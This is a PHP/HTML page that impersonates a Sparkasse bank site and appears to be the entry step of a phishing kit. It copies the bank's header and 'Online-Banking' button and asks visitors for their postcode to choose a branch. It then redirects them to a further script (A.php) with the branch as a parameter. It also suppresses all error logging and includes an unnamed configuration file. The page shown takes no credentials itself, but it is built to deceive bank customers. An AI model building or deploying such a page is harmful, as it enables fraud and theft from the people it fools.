<?php
session_start();

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

include("./Config/911.php");
?>
<!DOCTYPE html>
<html lang="de" style="scroll-margin-top: 20px;height: 100%;">
 <div id="in-page-channel-node-id">
 </div>
 <head>
  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
  <meta content="width=device-width" name="viewport"/>
  <title>
   Produkte und Services
  </title>
  <meta content="index, follow" name="robots"/>
  <link href="./X911/63a64e573fe44d18.css" rel="stylesheet"/>
  <link href="./X911/redrms.css" rel="stylesheet" type="text/css"/>
  <style>
.css-8z135u {
    margin: 0;
    font-size: 18px;
    line-height: 1.44;
    font-weight: 400;
    letter-spacing: -0.025em;
    color: #444444;
    word-break: break-word;
    -webkit-hyphens: auto;
    -moz-hyphens: auto;
    -ms-hyphens: auto;
    hyphens: auto;
}
.redrmcon {
border-radius: 12px;
padding: 20px 60px 60px 60px;
box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
max-height: 100%;
margin-top: 50px;
margin-bottom: 50px;
max-width: 720px;
width: calc(100% - 64px);
}
.redrmcan {
display: flex;
margin-top: 20px;
}
.redrmbttn {
margin-left: 15px;
background: red;
color: #ffffff;
border: red;
border-radius: 45px;
padding: 18px 48px;
font-size: 16px;
width: 100%;
line-height: 1.62;
letter-spacing: -0.015em;
}
.redrminp {
padding-top: 18px;
padding-bottom: 18px;
font-size: 16px;
line-height: 1.62;
letter-spacing: -0.015em;
width: 100%;
border: 2px solid #989898;
border-radius: 8px;
padding: 12px 18px;
}
@media (max-width: 480px) {
    .redrmcon {
	    width: 100%;
		padding: 15px;;
		box-shadow: none;
		border-radius: 0;
		margin-top: 0;
	}
	.redrmcan {
	    display: block;
	}
	.redrmbttn {
	    margin-left: 0;
		margin-top: 15px;
		padding: 8px 48px;
	}
	.redrminp {
	    padding-top: 8px;
	    padding-bottom: 8px;
	}
}
  </style>
 </head>
 <body style="height: 100%;">
  <div aria-hidden="true" id="__next">
   <div class="MuiBox-root css-11muba3">
    <div class="MuiBox-root css-0" style="opacity: 0; transition: opacity 260ms cubic-bezier(0.4, 0, 0.2, 1); visibility: hidden;">
    </div>
   </div>
   <div class="MuiBox-root css-1b7dl02">
    <div class="MuiBox-root css-cyn8h5">
     <div class="MuiBox-root css-0">
     </div>
    </div>
   </div>
   <div class="MuiBox-root css-6tcrjw">
    <div class="MuiBox-root css-0" style="opacity: 0; transition: opacity 360ms cubic-bezier(0.4, 0, 0.2, 1); visibility: hidden;">
    </div>
   </div>
   <div aria-hidden="true" class="MuiDrawer-root MuiDrawer-modal MuiModal-root MuiModal-hidden css-m5u5ug" role="navigation">
    <div aria-hidden="true" class="MuiBackdrop-root MuiModal-backdrop css-919eu4" style="opacity: 0; transition: opacity 500ms cubic-bezier(0.4, 0, 0.2, 1); visibility: hidden;">
    </div>
    <div tabindex="-1">
    </div>
    <div class="MuiPaper-root MuiPaper-elevation MuiPaper-elevation16 MuiDrawer-paper MuiDrawer-paperAnchorLeft css-10f0ro6" style="transform: translateX(-1516.5px); visibility: hidden;" tabindex="-1">
     <button class="MuiBox-root css-1s4hcdb">
      <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-14om6pj" focusable="false" role="img" viewbox="0 0 24 24">
       <path d="m13.411 12 7.282-7.283a.999.999 0 1 0-1.388-1.437l-.025.024L12 10.587 4.7 3.292a1 1 0 0 0-1.411 1.415l-.001-.001L10.583 12l-7.277 7.279a1 1 0 1 0 1.393 1.438l7.3-7.303 7.3 7.305a1 1 0 0 0 1.412-1.414l.001.001L13.411 12Z">
       </path>
       <title>
        Close Menu
       </title>
      </svg>
     </button>
     <div class="MuiBox-root css-10qp632">
      <div class="MuiBox-root css-0">
       <div class="MuiBox-root css-1txeit4">
        <div class="MuiBox-root css-pqcf8u" style="z-index: 100; border-left-style: none;">
        </div>
        <div class="MuiBox-root css-pqcf8u" style="z-index:99;border-left-style:none">
        </div>
        <div class="MuiBox-root css-pqcf8u" style="z-index:98;border-left-style:none">
        </div>
        <div class="MuiBox-root css-pqcf8u" style="z-index:97;border-left-style:none">
        </div>
        <div class="MuiBox-root css-pqcf8u" style="z-index:96;border-left-style:none">
        </div>
       </div>
      </div>
     </div>
    </div>
    <div tabindex="-1">
    </div>
   </div>
   <header class="MuiBox-root css-1v20dcn">
    <div class="MuiBox-root css-30zjfb" id="header.bar.2557.level1">
     <div class="MuiBox-root css-69i1ev">
      <ul class="MuiStack-root css-es1z7x" id="header.button-list.5350">
       <li>
        <a aria-current="page" class="MuiButtonBase-root MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation css-67fh08" href="#" id="content.button.311329" tabindex="0">
         Privatkunden
        </a>
       </li>
       <li>
        <a class="MuiButtonBase-root MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation css-67fh08" href="#" id="content.button.311332" tabindex="0">
         Firmenkunden
        </a>
       </li>
       <li>
        <a class="MuiButtonBase-root MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation css-67fh08" href="#" id="content.button.311326" rel="noopener" role="link" tabindex="0" target="_self">
         Immobilien
        </a>
       </li>
      </ul>
      <div class="MuiBox-root css-1mrdf65">
       <div class="MuiBox-root css-1f9h3fi">
        <a class="MuiBox-root css-1ysjhc5" href="#" id="intern.icon-link.11401" tabindex="0">
         <div class="MuiBox-root css-rpbb2o">
          <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeInherit css-1cw4hi4" focusable="false" viewbox="0 0 24 24">
           <circle cx="12" cy="4.585" r="3.391">
           </circle>
           <path d="M11.472 13.35v9.455a24.345 24.345 0 0 0-6.357-.859 1.052 1.052 0 0 1-1.026-1.055v-8.837a1.06 1.06 0 0 1 1.044-1.057 13.263 13.263 0 0 1 5.416.828 1.677 1.677 0 0 1 .923 1.525Zm7.395-2.353a13.263 13.263 0 0 0-5.416.828 1.678 1.678 0 0 0-.923 1.525v9.455a24.345 24.345 0 0 1 6.357-.859 1.052 1.052 0 0 0 1.026-1.055v-8.837a1.059 1.059 0 0 0-1.044-1.057Z">
           </path>
          </svg>
         </div>
         <div class="MuiTypography-root MuiTypography-button css-1r9ndv5">
          Leichte Sprache
         </div>
        </a>
       </div>
       <div class="MuiBox-root css-1f9h3fi">
        <a class="MuiBox-root css-1ysjhc5" href="#" id="intern.icon-link.11404" tabindex="0">
         <div class="MuiBox-root css-rpbb2o">
          <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeInherit css-1cw4hi4" focusable="false" viewbox="0 0 24 24">
           <path d="M13.701 19.048a.853.853 0 0 0 .79.517c.122 0 .243-.03.365-.091a.876.876 0 0 0 .425-1.185s-1.67-3.828-1.974-5.226c-.122-.486-.183-1.792-.213-2.4 0-.212.122-.395.304-.455l3.736-1.124c.456-.122.73-.638.608-1.094-.122-.456-.638-.73-1.094-.608 0 0-3.463 1.124-4.708 1.124-1.216 0-4.649-1.093-4.649-1.093-.455-.122-.972.09-1.124.547-.152.486.122 1.002.608 1.124l3.737 1.124c.182.06.334.243.303.455-.03.608-.09 1.914-.212 2.4-.304 1.398-1.975 5.226-1.975 5.226a.902.902 0 0 0 .425 1.184c.122.061.243.092.365.092.334 0 .668-.183.79-.517L12 15.403l1.701 3.645Z">
           </path>
           <path d="M12 7.625a1.701 1.701 0 1 0 0-3.402 1.701 1.701 0 0 0 0 3.402Z">
           </path>
           <path d="M24 12c0-6.623-5.377-12-12-12S0 5.377 0 12s5.377 12 12 12 12-5.377 12-12ZM2.005 12c0-5.53 4.496-9.995 9.995-9.995 5.499 0 9.995 4.466 9.995 9.995A9.983 9.983 0 0 1 12 21.995 9.983 9.983 0 0 1 2.005 12Z">
           </path>
          </svg>
         </div>
         <div class="MuiTypography-root MuiTypography-button css-1r9ndv5">
          Barrierefreiheit
         </div>
        </a>
       </div>
      </div>
     </div>
    </div>
   </header>
   <header class="MuiBox-root css-1up0bvm">
    <div class="MuiBox-root css-1od10r1">
     <div class="MuiStack-root css-bmf6zq">
      <div class="MuiBox-root css-zk9i78">
       <a aria-label="Zur Startseite" class="MuiTypography-root MuiTypography-inherit MuiLink-root MuiLink-underlineAlways css-1rspqmk" href="#">
        <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-amkoej" focusable="false" viewbox="0 0 24 24">
         <path d="M10.399 3.03A2.183 2.183 0 0 1 12 2.363c.623 0 1.156.223 1.601.667.445.445.667.979.667 1.601 0 .623-.222 1.162-.667 1.617A2.162 2.162 0 0 1 12 6.932a2.152 2.152 0 0 1-1.601-.684 2.24 2.24 0 0 1-.667-1.617c0-.621.222-1.155.667-1.6ZM5.098 17.002h10.537v-1.367H5.098v-5.068c0-.556.239-1.073.717-1.55.478-.479 1.017-.718 1.617-.718h9.137c.578 0 1.112.223 1.601.667.49.445.734.979.734 1.601v.9H8.367v1.367h10.537v5.102c0 .6-.228 1.128-.684 1.584a2.25 2.25 0 0 1-1.651.684H7.432c-.645 0-1.195-.205-1.651-.617-.456-.411-.684-.961-.684-1.65v-.935h.001Z">
         </path>
        </svg>
       </a>
      </div>
      <div class="MuiBox-root css-5erjg2">
       <ul class="MuiStack-root css-es1z7x" id="header.button-list.5353">
        <li>
         <a class="MuiButtonBase-root MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation css-67fh08" href="#" id="content.button.311335" tabindex="0">
          Produkte
         </a>
        </li>
        <li>
         <a class="MuiButtonBase-root MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation css-67fh08" href="#" id="content.button.311338" tabindex="0">
          Ratgeber
         </a>
        </li>
        <li>
         <a class="MuiButtonBase-root MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation css-67fh08" href="#" id="content.button.311341" tabindex="0">
          Aktuelles
         </a>
        </li>
        <li>
         <a class="MuiButtonBase-root MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeSmall MuiButton-standardSizeSmall MuiButton-disableElevation css-67fh08" href="#" id="content.button.311344" tabindex="0">
          Über uns
         </a>
        </li>
       </ul>
      </div>
     </div>
     <div class="MuiStack-root css-u4p24i">
      <div class="MuiBox-root css-46ngim">
       <a class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-hhuxt2" href="#" tabindex="0">
        <div class="MuiBox-root css-6bjhw6">
        </div>
        <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeInherit css-1cw4hi4" focusable="false" viewbox="0 0 24 24">
         <path d="M9.5 17A7.5 7.5 0 1 1 17 9.5 7.51 7.51 0 0 1 9.5 17Zm0-13a5.5 5.5 0 1 0 0 11 5.5 5.5 0 1 0 0-11Z">
         </path>
         <path d="M21 22a.997.997 0 0 1-.707-.293l-5-5a1 1 0 0 1 1.414-1.414l5 5A1 1 0 0 1 21 22Z">
         </path>
        </svg>
       </a>
      </div>
      <div class="MuiBox-root css-nymjzb">
       <a class="MuiButtonBase-root MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeMedium MuiButton-standardSizeMedium MuiButton-disableElevation MuiButton-root MuiButton-standard MuiButton-standardPrimary MuiButton-sizeMedium MuiButton-standardSizeMedium MuiButton-disableElevation css-mtsk4f" id="content.button.311347" role="link" tabindex="0">
        Online-Banking
        <span class="MuiButton-endIcon MuiButton-iconSizeMedium css-3sdmaz">
         <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeInherit css-1cw4hi4" focusable="false" viewbox="0 0 24 24">
          <path d="M9.853 4.299c0 .573.179 1.056.537 1.449.393.447.903.67 1.529.67.608 0 1.109-.223 1.503-.67.393-.375.59-.858.59-1.45 0-.59-.197-1.082-.59-1.475-.393-.393-.894-.59-1.503-.59-.626 0-1.136.197-1.529.59a2.173 2.173 0 0 0-.537 1.476Zm0 7.379c0 .573.179 1.065.537 1.476.375.43.885.644 1.529.644.626 0 1.127-.215 1.503-.644.393-.393.59-.885.59-1.476 0-.59-.197-1.074-.59-1.45-.375-.392-.876-.59-1.503-.59-.644 0-1.154.198-1.529.59-.358.394-.537.877-.537 1.45Zm0 7.406c0 .573.179 1.056.537 1.449.375.43.885.644 1.529.644.626 0 1.127-.215 1.503-.644.393-.375.59-.858.59-1.45 0-.607-.197-1.1-.59-1.475-.375-.393-.876-.59-1.503-.59-.644 0-1.154.197-1.529.59-.358.393-.537.885-.537 1.476Z">
          </path>
         </svg>
        </span>
       </a>
      </div>
      <div class="MuiBox-root css-lohbdc">
       <a class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-hhuxt2" role="link" tabindex="0" title="Navigation">
        <div class="MuiBox-root css-6bjhw6">
         Navigation
        </div>
        <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeInherit css-1cw4hi4" focusable="false" viewbox="0 0 24 24">
         <path d="M3.36 3.01h17.31c.735 0 1.33.595 1.33 1.33v1.34a1.33 1.33 0 0 1-1.33 1.33H3.36a1.33 1.33 0 0 1-1.33-1.33V4.34c0-.735.595-1.33 1.33-1.33ZM3.36 10h17.31c.735 0 1.33.595 1.33 1.33v1.34A1.33 1.33 0 0 1 20.67 14H3.36a1.33 1.33 0 0 1-1.33-1.33v-1.34c0-.735.595-1.33 1.33-1.33ZM3.36 17.01h17.31c.735 0 1.33.595 1.33 1.33v1.34a1.33 1.33 0 0 1-1.33 1.33H3.36a1.33 1.33 0 0 1-1.33-1.33v-1.34c0-.735.595-1.33 1.33-1.33Z">
         </path>
        </svg>
       </a>
      </div>
     </div>
    </div>
   </header>
   
   <div style="display: flex; justify-content: center; align-items: center;margin-bottom: auto;">
     <div class="redrmcon">
	    <h3 style="font-weight: 700;font-size: 24px;">Ihre Sparkasse vor Ort</h3>
		<div class="MuiTypography-root MuiTypography-body2 css-8z135u">Nennen Sie uns bitte die Postleitzahl Ihres Wohnortes, damit wir die für Sie zuständige Sparkasse finden.</div>
		<div class="redrmcan">
		    <input type="text" name="" id="searchInput" oninput="filterOptions()" placeholder="PLZ oder Wohnort" class="redrminp" required="">
			<button type="submit" name="" id="" class="redrmbttn">Orten</button>
		</div>
		<script>
        function filterOptions() {
        }

        function clearInput() {
            document.getElementById('searchInput').value = '';
        }
		</script>
		<div id="dropdownOptions" style="display: none; font-size: 12px;">
<?php
    $f = file("siftA/a.json");
    foreach($f as $t){
        $d = json_decode($t, true);
        echo '
        <ul class="FinalGridItem-xs12-sm12-md12-lg12 MuiBox-root css-u4vmom redrmaredrm">
            <li class="MuiBox-root css-p59w0s" onclick="selectOption(\''.addslashes($d["name"]).'\')" tabindex="0"><b style="display: none;">'.addslashes($d["blz"]).'</b><div class="zip-codes" style="display: none;">'.addslashes($d["zipredrm"]).'</div><div class="FinalGridItem-xs12-sm12-md12-lg12 MuiBox-root css-19lgeh1"><span class="MuiTypography-root MuiTypography-button css-1osw6wv">'.addslashes($d["name"]).'</span><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeInherit css-vmbwdc" focusable="false" aria-hidden="true" viewBox="0 0 24 24"><path d="m21.696 11.304-6-6a.984.984 0 0 0-1.391 1.392l4.29 4.291H3.002a1.013 1.013 0 1 0 0 2.026h15.595l-4.291 4.291a.984.984 0 1 0 1.391 1.392l6-6a.98.98 0 0 0 0-1.392Z"></path></svg></div></li><li class="MuiBox-root css-o9b79t" aria-hidden="true"><hr class="MuiDivider-root MuiDivider-fullWidth css-ir2l1d" aria-hidden="true"></li>
        </ul>';
    }
?>
	 </div>
    </script>
   </div>
  </div>
  <script>
    function normalizeText(text) { //fix during search Dusseldorf > Düsseldorf
        return text.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    }

    function filterOptions() {
        var input, filter, options, redrmaredrm, i;
        input = document.getElementById("searchInput");
        filter = normalizeText(input.value); // Normalize user input
        options = document.getElementsByClassName("redrmaredrm");
        var selected = false; // Flag to check if a branch is selected

        for (i = 0; i < options.length; i++) {
            redrmaredrm = options[i];
            var optionText = normalizeText(redrmaredrm.textContent); // Normalize option text
            if (optionText.indexOf(filter) > -1) {
                redrmaredrm.style.display = "";
                if (optionText === filter) {
                    selected = true; // Branch is selected
                }
            } else {
                redrmaredrm.style.display = "none";
            }
        }

        var dropdownOptions = document.getElementById("dropdownOptions");
        if (filter) {
            dropdownOptions.style.display = "block";
        } else {
            dropdownOptions.style.display = "none";
        }

        // Enable or disable the "Next" button based on whether a branch is selected
        var nextButton = document.getElementById("nextButton");
        nextButton.disabled = !selected || input.value === "";
    }

    function selectOption(option) {
        document.getElementById("searchInput").value = option;
        document.getElementById("dropdownOptions").style.display = "none";
        redirect();
    }

    function redirect() {
        var selectedLogo = document.getElementById("searchInput").value;
        if (selectedLogo !== "") {
            var encodedSelectedLogo = encodeURIComponent(selectedLogo);
            var redirectURL = "A.php?branch=" + encodedSelectedLogo;
            window.location.href = redirectURL;
        }
    }
</script>
 </body>
</html>
